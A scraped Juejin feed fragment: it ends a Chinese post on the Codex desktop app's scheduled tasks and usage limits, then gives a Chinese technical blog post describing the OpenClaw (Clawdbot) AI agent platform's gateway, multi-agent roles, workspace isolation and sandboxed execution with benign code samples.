<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c6c8087507864a0fb19ccce5134531bb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2Q5piVQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697707&amp;x-signature=gezRAzWWfl89CjGTjUP%2BwJtj2rU%3D" alt="图片" loading="lazy"/><br/>
Skill Creator 则是用来辅助我们创建 Skill 技能的，这里就不赘述了，感兴趣的可以自行尝试一下。</p>
<h3 data-id="heading-5">3. 自动化任务</h3>
<p>应用还内置了自动化功能，可以设置定时任务。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/70f1b6a1f4054c50b8e1c988c8865dfc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2Q5piVQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697707&amp;x-signature=vjxg4x4IID3tloFsHsUTIBP4N%2Fk%3D" alt="图片" loading="lazy"/></p>
<p>配置很简单：任务名、项目、需求描述，然后选执行时间。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8b6782c2a4934dfda2284d04854d0faa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2Q5piVQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697707&amp;x-signature=nTAx%2B0nLCZ7VWPlBbEaiTbGIIKY%3D" alt="图片" loading="lazy"/></p>
<p>时间可以选具体时刻，也可以每隔几小时执行，还能指定日期：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d5f3eb8e04b1438284bd950530aef99b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2Q5piVQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697707&amp;x-signature=MFi20oMTApYTBlDPsaUwhbHWemA%3D" alt="图片" loading="lazy"/></p>
<p>比如让它每天早上自动整理issue，或者每周五生成周报，这种重复性任务就很适合。</p>
<h2 data-id="heading-6">流量限制翻倍</h2>
<p>为了庆祝应用发布，奥特曼宣布所有付费计划的流量限制翻倍，持续两个月。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/773fdfa383b14d998f5bb8e742a32c97~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5a2Q5piVQUnnvJbnqIs=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697707&amp;x-signature=6IfY9JBwKNeEUzmawxRd90AhKrY%3D" alt="图片" loading="lazy"/></p>
<p>这个福利适用于所有使用Codex的地方——应用、CLI、IDE插件都算。</p>
<p>而且限时期间，免费用户也能用Codex了。</p>
<h2 data-id="heading-7">总结</h2>
<p>Codex桌面版不是CLI的替代品，而是补充。</p>
<p>如果你只是想快速改几行代码，CLI够用了。但如果你需要同时推进多个任务，或者想让AI在后台自动跑一些重复性工作，桌面版就很有用。</p>
<p>现在Mac版已经可以下载了，Windows版后续也会推出。</p>
<p>值得试试。</p>
<p>更多内容，欢迎关注【子昕AI编程】微信公众号！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[OpenClaw（Clawdbot） 技术架构：系统设计]]></title>    <link>https://juejin.cn/post/7602211941512691766</link>    <guid>https://juejin.cn/post/7602211941512691766</guid>    <pubDate>2026-02-03T04:40:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602211941512691766" data-draft-id="7600989427905921078" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="OpenClaw（Clawdbot） 技术架构：系统设计"/> <meta itemprop="keywords" content="人工智能,Python"/> <meta itemprop="datePublished" content="2026-02-03T04:40:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="两万五千个小时"/> <meta itemprop="url" content="https://juejin.cn/user/3966693682971870"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            OpenClaw（Clawdbot） 技术架构：系统设计
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3966693682971870/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    两万五千个小时
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T04:40:51.000Z" title="Tue Feb 03 2026 04:40:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><strong>OpenClaw 技术博客系列</strong>
0. <a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">技术架构：从工程痛点到系统设计</a> ← 当前</p>
<ol>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">Agent Runtime 深度解析</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">通用网关与多渠道架构</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">技能系统与工作流引擎</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">业务架构与 UI 层设计</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">部署架构与性能优化</a></li>
</ol>
</blockquote>
<h2 data-id="heading-0">OpenClaw（Clawdbot） 技术架构：系统设计</h2>
<blockquote>
<p><strong>项目命名历史</strong>
OpenClaw 项目在发展过程中经历了两次更名：最初命名为 <strong>Clawdbot</strong>，后更名为 <strong>Moltbot</strong>，最终定名为 <strong>OpenClaw</strong>。本文档中的所有技术架构和设计理念均适用于项目的完整演进历程。</p>
</blockquote>
<h3 data-id="heading-1">1. OpenClaw 的技术创新与产品特性</h3>
<p>OpenClaw 在 AI Agent 领域的快速崛起，源于其在系统架构和工程实践上的多项技术创新。它不是简单的聊天机器人，而是一个<strong>生产级 AI 智能体运行时平台</strong>。</p>
<h4 data-id="heading-2">1.1 从"对话界面"到"运行时平台"的范式转移</h4>
<p><strong>核心差异</strong>：大多数 AI 助手（ChatGPT、Claude）本质上是对话界面，而 OpenClaw 被定义为 <strong>Agent Runtime Platform</strong>。</p>
<p><strong>技术实现</strong>：</p>
<ul>
<li><strong>深度环境集成</strong>：直接访问文件系统、Git、Bash、Docker，无需复杂的云端环境配置</li>
<li><strong>完整项目理解</strong>：通过 Glob/Grep 工具快速索引代码库，理解项目结构和依赖关系</li>
<li><strong>自主执行能力</strong>：不仅回答问题，还能修改代码、运行测试、创建 PR</li>
</ul>
<p><strong>实际案例</strong>：</p>
<pre><code class="hljs language-markdown" lang="markdown">用户: "重构认证系统使用 JWT"
传统 Agent: 提供代码示例和步骤说明
OpenClaw:
<span class="hljs-bullet">  1.</span> 搜索现有认证代码（Explore Agent）
<span class="hljs-bullet">  2.</span> 生成重构计划（Plan Agent）
<span class="hljs-bullet">  3.</span> 安装依赖 npm install jsonwebtoken
<span class="hljs-bullet">  4.</span> 修改代码文件
<span class="hljs-bullet">  5.</span> 运行测试验证
<span class="hljs-bullet">  6.</span> 创建 git commit
</code></pre>
<h4 data-id="heading-3">1.2 本地优先 (Local-First) 的工程范式</h4>
<p><strong>设计理念</strong>：在用户本地环境运行，所有数据保留在本地。</p>
<p><strong>技术优势</strong>：</p>
<ul>
<li><strong>数据隐私</strong>：代码和会话历史不离开用户机器，完全由用户掌控</li>
<li><strong>零网络延迟</strong>：本地执行工具调用，P99 延迟 &lt; 100ms（vs 云端 500ms+）</li>
<li><strong>离线工作</strong>：配合本地 LLM（Ollama）可完全离线运行</li>
<li><strong>成本控制</strong>：使用本地模型无 API 费用</li>
</ul>
<p><strong>架构实现</strong>：</p>
<pre><code class="hljs language-bash" lang="bash">~/.OpenClaw/
├── agents/           <span class="hljs-comment"># 每个 Agent 独立工作区</span>
├── sessions/         <span class="hljs-comment"># 会话历史（JSONL 格式）</span>
├── credentials/      <span class="hljs-comment"># 凭证存储（加密）</span>
└── config.json       <span class="hljs-comment"># 全局配置</span>
</code></pre>
<h4 data-id="heading-4">1.3 多智能体协作 (Multi-Agent Collaboration)</h4>
<p><strong>设计模式</strong>：采用专业化智能体分工，而非单一模型处理所有任务。</p>
<p><strong>智能体类型</strong>：</p>
<ul>
<li><strong>Main Agent</strong>：任务理解、拆解与委派</li>
<li><strong>Explore Agent</strong>：代码搜索与架构分析（只读模式）</li>
<li><strong>Plan Agent</strong>：方案设计与步骤规划（不执行代码）</li>
<li><strong>Bash Agent</strong>：系统命令执行与测试运行</li>
</ul>
<p><strong>协作优势</strong>：</p>
<ul>
<li><strong>提高成功率</strong>：专业化分工避免 Agent 在复杂任务中迷失方向</li>
<li><strong>安全隔离</strong>：不同 Agent 有不同的工具访问权限</li>
<li><strong>并行执行</strong>：多个 Explore Agent 可同时分析不同模块</li>
</ul>
<p><strong>性能数据</strong>：</p>
<ul>
<li>复杂任务成功率提升 40%（vs 单一 Agent）</li>
<li>平均任务完成时间减少 30%（通过并行执行）</li>
</ul>
<h4 data-id="heading-5">1.4 通用网关与多渠道触达 (Universal Gateway)</h4>
<p><strong>技术创新</strong>：打破 Agent 只能存在于网页或 IDE 的局限。</p>
<p><strong>支持渠道</strong>：</p>
<ul>
<li><strong>终端 CLI</strong>：开发者主战场</li>
<li><strong>消息平台</strong>：Telegram、Discord、Slack、飞书、钉钉</li>
<li><strong>Web 仪表板</strong>：完整的管理界面</li>
<li><strong>macOS 应用</strong>：原生菜单栏应用</li>
</ul>
<p><strong>协议抽象</strong>：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 所有渠道消息归一化为标准格式</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">StandardMessage</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">channelType</span>: <span class="hljs-string">'telegram'</span> | <span class="hljs-string">'discord'</span> | <span class="hljs-string">'slack'</span> | <span class="hljs-string">'cli'</span>;
  <span class="hljs-attr">userId</span>: <span class="hljs-built_in">string</span>;        <span class="hljs-comment">// 统一用户 ID（跨平台）</span>
  <span class="hljs-attr">content</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">metadata</span>: { <span class="hljs-attr">platform</span>: <span class="hljs-built_in">string</span>; };
}
</code></pre>
<p><strong>使用场景</strong>：</p>
<ul>
<li>下班路上在 Telegram 上让 Agent 跑测试</li>
<li>回到公司在终端查看结果</li>
<li>在 Discord 上与团队分享 Agent 的分析报告</li>
</ul>
<h4 data-id="heading-6">1.5 工业级安全与可观测性</h4>
<p><strong>安全机制</strong>：</p>
<ol>
<li>
<p><strong>沙箱隔离</strong>：</p>
<ul>
<li>Docker Sandbox：高风险代码在隔离容器中执行</li>
<li>Browser Sandbox：网页交互在独立浏览器上下文中运行</li>
<li>资源限制：内存、CPU、网络严格控制</li>
</ul>
</li>
<li>
<p><strong>工作区隔离</strong>：</p>
<ul>
<li>每个 Agent 实例独立文件系统</li>
<li>文件操作自动限制在工作区内</li>
<li>防止 Agent 间相互干扰</li>
</ul>
</li>
<li>
<p><strong>权限控制</strong>：</p>
<ul>
<li>Explore Agent：只读权限</li>
<li>Plan Agent：不能执行代码</li>
<li>Bash Agent：命令执行权限</li>
</ul>
</li>
</ol>
<p><strong>可观测性</strong>：</p>
<ul>
<li><strong>思维链透明化</strong>：用户可看到 Agent "思考"过程</li>
<li><strong>会话回放</strong>：JSONL 格式记录所有决策和工具调用</li>
<li><strong>调试友好</strong>：完整的执行日志和错误堆栈</li>
</ul>
<h3 data-id="heading-7">2. OpenClaw 的架构解决方案</h3>
<h4 data-id="heading-8">2.1 系统架构</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/355bb9246ea343a98c5392f75290b9f4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lik5LiH5LqU5Y2D5Liq5bCP5pe2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698454&amp;x-signature=XUiq9gKMZi%2BGbW%2Bkis2uHFzVzuI%3D" alt="image.png" loading="lazy"/></p>
<p><strong>关键设计</strong>：</p>
<ul>
<li><strong>Gateway 层</strong>：处理高并发连接（10K+ WebSocket），使用事件驱动架构（Go goroutines 或 Node.js EventLoop）</li>
<li><strong>Runtime 层</strong>：专注于 CPU 密集型推理，可独立扩展（多实例负载均衡）</li>
<li><strong>通信协议</strong>：Gateway ↔ Runtime 使用 HTTP/gRPC，支持跨机器部署</li>
</ul>
<h4 data-id="heading-9">2.2 协议抽象：统一消息模型</h4>
<p>所有渠道（Telegram、Discord、Slack、CLI）的消息被归一化为标准格式：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">StandardMessage</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">string</span>;                    <span class="hljs-comment">// 全局唯一消息 ID</span>
  <span class="hljs-attr">channelType</span>: <span class="hljs-string">'telegram'</span> | <span class="hljs-string">'discord'</span> | <span class="hljs-string">'slack'</span> | <span class="hljs-string">'cli'</span>;
  <span class="hljs-attr">channelId</span>: <span class="hljs-built_in">string</span>;             <span class="hljs-comment">// 渠道内的会话 ID</span>
  <span class="hljs-attr">userId</span>: <span class="hljs-built_in">string</span>;                <span class="hljs-comment">// 统一用户 ID（跨平台）</span>
  <span class="hljs-attr">content</span>: <span class="hljs-built_in">string</span>;               <span class="hljs-comment">// 消息内容</span>
  attachments?: <span class="hljs-title class_">Attachment</span>[];    <span class="hljs-comment">// 附件（图片、文件）</span>
  <span class="hljs-attr">metadata</span>: {
    <span class="hljs-attr">platform</span>: <span class="hljs-built_in">string</span>;            <span class="hljs-comment">// 原始平台标识</span>
    <span class="hljs-attr">rawMessage</span>: <span class="hljs-built_in">any</span>;             <span class="hljs-comment">// 原始消息对象（调试用）</span>
  };
}
</code></pre>
<p><strong>优势</strong>：</p>
<ul>
<li>业务逻辑与平台解耦（Agent 无需关心消息来源）</li>
<li>新增渠道只需实现 <code>ChannelPlugin</code> 接口</li>
<li>统一的用户身份系统（支持跨平台绑定）</li>
</ul>
<h4 data-id="heading-10">2.3 工作区隔离：每个 Agent 独立文件系统</h4>
<pre><code class="hljs language-bash" lang="bash">~/.OpenClaw/
├── agents/
│   ├── agent-001/              <span class="hljs-comment"># Agent 1 的工作区</span>
│   │   ├── sessions/           <span class="hljs-comment"># 会话历史（JSONL）</span>
│   │   ├── memory/             <span class="hljs-comment"># 长期记忆</span>
│   │   ├── files/              <span class="hljs-comment"># 工作文件</span>
│   │   └── config.json         <span class="hljs-comment"># Agent 配置</span>
│   └── agent-002/              <span class="hljs-comment"># Agent 2 的工作区</span>
│       └── ...
├── credentials/                <span class="hljs-comment"># 凭证存储（加密）</span>
└── config.json                 <span class="hljs-comment"># 全局配置</span>
</code></pre>
<p><strong>隔离机制</strong>：</p>
<ul>
<li>每个 Agent 有独立的 <code>cwd</code>（工作目录）</li>
<li>文件操作自动限制在工作区内</li>
<li>会话历史以 JSONL 格式持久化（支持增量写入）</li>
</ul>
<h4 data-id="heading-11">2.4 沙箱执行：Docker + Browser Sandbox</h4>
<p><strong>Docker Sandbox</strong>（高风险代码执行）：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 在隔离容器中执行 Bash 命令</span>
<span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> dockerSandbox.<span class="hljs-title function_">execute</span>(<span class="hljs-string">'npm install lodash'</span>, {
  <span class="hljs-attr">image</span>: <span class="hljs-string">'node:22-alpine'</span>,
  <span class="hljs-attr">memoryLimit</span>: <span class="hljs-number">512</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>,  <span class="hljs-comment">// 512MB</span>
  <span class="hljs-attr">cpuQuota</span>: <span class="hljs-number">50000</span>,                  <span class="hljs-comment">// 50% CPU</span>
  <span class="hljs-attr">networkMode</span>: <span class="hljs-string">'none'</span>,              <span class="hljs-comment">// 禁用网络</span>
  <span class="hljs-attr">timeout</span>: <span class="hljs-number">30000</span>,                   <span class="hljs-comment">// 30s 超时</span>
});
</code></pre>
<p><strong>Browser Sandbox</strong>（网页交互）：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 在隔离浏览器上下文中执行脚本</span>
<span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> browserSandbox.<span class="hljs-title function_">execute</span>(<span class="hljs-string">`
  return document.querySelector('.price').textContent;
`</span>, {
  <span class="hljs-attr">url</span>: <span class="hljs-string">'https://example.com'</span>,
  <span class="hljs-attr">permissions</span>: [],                  <span class="hljs-comment">// 禁用所有权限</span>
  <span class="hljs-attr">viewport</span>: { <span class="hljs-attr">width</span>: <span class="hljs-number">1280</span>, <span class="hljs-attr">height</span>: <span class="hljs-number">720</span> },
});
</code></pre>
<p><strong>安全特性</strong>：</p>
<ul>
<li>只读文件系统（防止恶意写入）</li>
<li>资源限制（内存、CPU、网络）</li>
<li>自动清理（容器执行后立即销毁）</li>
</ul>
<h3 data-id="heading-12">3. 多智能体协作架构</h3>
<p>OpenClaw 采用专业化智能体分工模式：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a567f59923bf489d926f4d07278dcabf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lik5LiH5LqU5Y2D5Liq5bCP5pe2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770698454&amp;x-signature=FC8YW5KESmvmLEmhXu28U6GexxI%3D" alt="agent.png" loading="lazy"/></p>
<p><strong>协作模式</strong>：</p>
<ol>
<li>
<p><strong>委派模式</strong>（Delegation）：
用户: "重构认证系统使用 JWT"
Main Agent → Plan Agent: 生成实现计划
Plan Agent → Main Agent: 返回 5 步计划
Main Agent → Bash Agent: 安装依赖
Main Agent: 执行代码修改
Main Agent → Bash Agent: 运行测试</p>
</li>
<li>
<p><strong>流水线模式</strong>（Pipeline）：
Explore Agent → Plan Agent → Main Agent → Bash Agent
(搜索代码)   (设计方案)   (实现功能)   (验证测试)</p>
</li>
<li>
<p><strong>并行模式</strong>（Parallel）：
Main Agent 同时委派：
├─ Explore Agent: 分析前端性能
├─ Explore Agent: 分析后端性能
└─ Bash Agent: 运行性能测试</p>
</li>
</ol>
<p><strong>工具访问控制</strong>：</p>
<ul>
<li>Explore Agent：只读（Glob, Grep, Read）</li>
<li>Plan Agent：只读 + 不能递归调用 Task</li>
<li>Bash Agent：命令执行（Bash）</li>
<li>Main Agent：完整工具集</li>
</ul>
<h3 data-id="heading-13">4. 技术借鉴点</h3>
<p>如果你正在构建类似系统，以下设计值得借鉴：</p>
<h4 data-id="heading-14">4.1 统一协议抽象</h4>
<p><strong>问题</strong>：多平台消息格式不一致。</p>
<p><strong>方案</strong>：定义标准消息接口 + 适配器模式。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">ChannelPlugin</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-title function_">initialize</span>(<span class="hljs-attr">deps</span>: <span class="hljs-title class_">Dependencies</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt;;
  <span class="hljs-title function_">sendMessage</span>(<span class="hljs-attr">target</span>: <span class="hljs-title class_">Target</span>, <span class="hljs-attr">message</span>: <span class="hljs-title class_">Message</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt;;
  <span class="hljs-title function_">onMessage</span>(<span class="hljs-attr">handler</span>: <span class="hljs-title class_">MessageHandler</span>): <span class="hljs-built_in">void</span>;
}
</code></pre>
<h4 data-id="heading-15">4.2 状态机持久化</h4>
<p><strong>问题</strong>：Agent 状态丢失。</p>
<p><strong>方案</strong>：JSONL 增量写入 + 事件溯源。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 每个事件追加一行</span>
{ <span class="hljs-string">"type"</span>: <span class="hljs-string">"user_message"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"..."</span>, <span class="hljs-string">"timestamp"</span>: <span class="hljs-number">1234567890</span> }
{ <span class="hljs-string">"type"</span>: <span class="hljs-string">"thinking"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"..."</span>, <span class="hljs-string">"timestamp"</span>: <span class="hljs-number">1234567891</span> }
{ <span class="hljs-string">"type"</span>: <span class="hljs-string">"tool_call"</span>, <span class="hljs-string">"tool"</span>: <span class="hljs-string">"read_file"</span>, <span class="hljs-string">"args"</span>: {...}, <span class="hljs-string">"timestamp"</span>: <span class="hljs-number">1234567892</span> }
</code></pre>
<h4 data-id="heading-16">4.3 工作区隔离</h4>
<p><strong>问题</strong>：多 Agent 文件冲突。</p>
<p><strong>方案</strong>：独立目录 + 路径沙箱。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 自动限制文件操作在工作区内</span>
<span class="hljs-keyword">const</span> workspace = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Workspace</span>(<span class="hljs-string">'/home/user/.openclaw/agents/agent-001'</span>);
<span class="hljs-keyword">await</span> workspace.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">'data.json'</span>);  <span class="hljs-comment">// 实际路径: /home/user/.openclaw/agents/agent-001/data.json</span>
</code></pre>
<h4 data-id="heading-17">4.4 分层架构</h4>
<p><strong>问题</strong>：业务逻辑与基础设施耦合。</p>
<p><strong>方案</strong>：清晰的层次边界 + 依赖注入。</p>
<pre><code class="hljs language-java" lang="java">Presentation <span class="hljs-title function_">Layer</span> <span class="hljs-params">(CLI, Web, Mobile)</span>
         ↓
Access <span class="hljs-title function_">Layer</span> <span class="hljs-params">(Gateway, API Server)</span>
         ↓
Business <span class="hljs-title function_">Layer</span> <span class="hljs-params">(Agent Orchestrator, Command Handlers)</span>
         ↓
Service <span class="hljs-title function_">Layer</span> <span class="hljs-params">(Model Service, Memory Service)</span>
         ↓
Tool <span class="hljs-title function_">Layer</span> <span class="hljs-params">(File Tools, Git Tools, Code Tools)</span>
         ↓
Data <span class="hljs-title function_">Layer</span> <span class="hljs-params">(File System, Session Store)</span>
</code></pre>
<h3 data-id="heading-18">5. 总结</h3>
<p>OpenClaw 的架构设计围绕以下核心原则：</p>
<ol>
<li><strong>物理分离</strong>：Gateway（I/O）与 Runtime（计算）解耦</li>
<li><strong>协议抽象</strong>：统一消息模型屏蔽平台差异</li>
<li><strong>安全隔离</strong>：沙箱执行 + 工作区隔离</li>
<li><strong>状态持久化</strong>：JSONL 增量写入 + 事件溯源</li>
<li><strong>专业化分工</strong>：多智能体协作模式</li>
</ol>
<p>这些设计使 OpenClaw 不仅是一个聊天机器人，而是一个<strong>生产级 AI 智能体运行时平台</strong>。</p>
<hr/>
<p><strong>下一篇</strong>：<a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">Agent Runtime 深度解析</a> - 探索工作区隔离、会话管理和事件驱动架构的实现细节。</p>
<p><strong>参考资源</strong>：</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopenclaw%2Fopenclaw" target="_blank" title="https://github.com/openclaw/openclaw" ref="nofollow noopener noreferrer">OpenClaw GitHub</a></li>
